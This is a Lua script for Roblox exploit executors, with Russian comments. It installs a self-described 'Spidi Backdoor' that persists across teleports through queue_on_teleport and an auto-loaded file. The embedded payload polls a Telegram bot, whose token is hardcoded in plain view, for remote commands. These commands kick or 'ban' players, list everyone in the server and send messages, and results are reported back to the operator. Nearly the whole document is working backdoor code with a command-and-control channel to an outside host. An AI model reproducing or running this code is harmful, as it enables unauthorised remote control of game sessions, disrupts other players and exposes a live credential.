-- ==================== АВТО-ЭКСЕКЬЮТ (БЕЗ ГИТХАБА) ====================
local function setupAutoExecute()
    local writefile = syn and syn.writefile or writefile or fluxus and fluxus.writefile
    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
    local readfile = syn and syn.readfile or readfile or fluxus and fluxus.readfile
    
    -- Сохраняем скрипт в файл
    if writefile then
        local scriptPath = "SpidiBackdoor.lua"
        
        -- Проверяем, есть ли уже файл
        if not readfile or not readfile(scriptPath) then
            local fullScript = [=[
--[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
 88      88    88    88            odD'      88      88    88 88ooo88 
 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

repeat wait() until game:IsLoaded()

local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")

local function req(method, url, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then return nil end
    local args = { Url = url, Method = method, Headers = headers or {} }
    if body then args.Body = body end
    local ok, res = pcall(f, args)
    if ok and res then return res else return nil end
end

local function send(text)
    if not CHAT_ID then return end
    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
    req("POST", "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
        { ["Content-Type"] = "application/json" },
        HttpService:JSONEncode(payload))
end

local function getChat()
    local res = req("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", {})
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result and #data.result > 0 then
            CHAT_ID = data.result[#data.result].message.chat.id
            return true
        end
    end
    return false
end

local function findPlayer(part)
    if not part or part == "" then return nil, "❌ Введи ник" end
    local matches = {}
    part = part:lower()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower():find(part, 1, true) or p.DisplayName:lower():find(part, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then
        return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do table.insert(names, p.Name) end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else
        return nil, "Игрок не найден"
    end
end

local function handle(cmd, args)
    if cmd == "start" then
        send("✅ Spidi Backdoor активирован!\n👤 Hacker228")
        return
    end
    
    if cmd == "help" then
        send("📋 <b>Команды Spidi:</b>\n\n"..
            "/kick [ник] - кикнуть\n"..
            "/ban [ник] - забанить\n"..
            "/message [ник] [текст] - сообщение\n"..
            "/players - список игроков\n"..
            "/rejoin - перезайти\n"..
            "/help - помощь")
        return
    end
    
    if cmd == "players" then
        local list = {}
        for _, p in pairs(Players:GetPlayers()) do table.insert(list, p.Name) end
        send("👥 Игроков: "..#list.."\n"..table.concat(list, ", "))
        return
    end
    
    if cmd == "rejoin" then
        send("🔄 Перезаход...")
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        return
    end
    
    local name = args[1]
    if not name then
        send("❌ Укажи ник или часть ника")
        return
    end
    
    local target, err = findPlayer(name)
    if not target then
        send("❌ "..err)
        return
    end
    
    if cmd == "kick" then
        target:Kick("Kicked by Spidi Backdoor")
        send("✅ Кикнут: <b>"..target.Name.."</b>")
        
    elseif cmd == "ban" then
        target:Kick("Banned by Spidi Backdoor")
        send("✅ Забанен: <b>"..target.Name.."</b>")
        
    elseif cmd == "message" then
        local msg = table.concat(args, " ", 2)
        if msg == "" or msg == name then
            send("❌ Введи текст сообщения: /message ник текст")
            return
        end
        StarterGui:SetCore("SendNotification", {
            Title = "Spidi Backdoor",
            Text = "📩 "..msg,
            Duration = 5
        })
        send("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
        
    else
        send("❌ Неизвестная команда. /help")
    end
end

local lastId = 0
local function poll()
    local res = req("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1), {})
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, upd in pairs(data.result) do
                if upd.message and upd.message.text then
                    local msg = upd.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        send("✅ Spidi Backdoor запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handle(cmd, parts)
                    end
                end
                if upd.update_id then lastId = upd.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(poll)
        wait(2)
    end
end)

local function createGUI()
    local player = Players.LocalPlayer
    if not player then return end
    
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        gui = Instance.new("PlayerGui")
        gui.Parent = player
    end
    
    local screen = Instance.new("ScreenGui")
    screen.Name = "Spidi Backdoor"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screen
    
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Parent = frame
    
    local grad = Instance.new("UIGradient")
    grad.Rotation = 50
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
    })
    grad.Parent = stroke
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Text = "Spidi Backdoor"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.TextSize = 36
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame
    
    local desc = Instance.new("TextLabel")
    desc.BackgroundTransparency = 1
    desc.Size = UDim2.new(1, -40, 0, 80)
    desc.Position = UDim2.new(0, 20, 0, 70)
    desc.Text = "Spidi Backdoor Active!\nTelegram Bot Connected"
    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
    desc.TextSize = 18
    desc.Font = Enum.Font.GothamBold
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.Parent = frame
    
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
    btn.Text = "OK"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 18
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        screen:Destroy()
    end)
    
    local UIS = game:GetService("UserInputService")
    local drag = false
    local startPos, startMouse, dragInput
    
    frame.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UIS:GetFocusedTextBox() then
            drag = true
            startPos = frame.Position
            startMouse = inp.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then drag = false end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)
    
    UIS.InputChanged:Connect(function(inp)
        if inp == dragInput and drag then
            local delta = inp.Position - startMouse
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

createGUI()

Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(function()
    wait(1)
    if not Players.LocalPlayer.Character then
        wait(2)
        createGUI()
    end
end)

wait(3)
getChat()
]=]
            
            writefile(scriptPath, fullScript)
            print("[Spidi] ✅ Скрипт сохранён: "..scriptPath)
        else
            print("[Spidi] ✅ Файл уже существует: "..scriptPath)
        end
    end
    
    -- Ставим в очередь для телепортов
    if queueteleport then
        queueteleport("loadfile('SpidiBackdoor.lua')()")
        print("[Spidi] ✅ queue_on_teleport сработал")
        return true
    else
        print("[Spidi] ❌ queue_on_teleport не найден")
        return false
    end
end

